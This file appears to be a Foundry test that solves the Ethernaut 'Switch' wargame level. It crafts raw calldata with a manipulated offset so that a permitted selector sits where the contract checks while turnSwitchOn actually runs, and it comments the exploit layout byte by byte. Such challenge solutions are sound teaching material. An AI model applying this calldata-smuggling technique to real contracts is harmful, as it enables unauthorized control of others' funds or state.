// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/29-Switch/SwitchFactory.sol";

contract SwitchTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testSwitchHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        SwitchFactory switchFactory = new SwitchFactory();
        ethernaut.registerLevel(switchFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(switchFactory);
        Switch ethernautSwitch = Switch(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        emit log_named_string(
            "switchOn before attack",
            ethernautSwitch.switchOn() ? "true" : "false"
        );

        // 30c13ade -> function selector for flipSwitch(bytes memory data)
        // 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
        // 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
        // 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
        // 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
        // 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        address(ethernautSwitch).call(callData);

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_string(
            "switchOn after attack ",
            ethernautSwitch.switchOn() ? "true" : "false"
        );

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
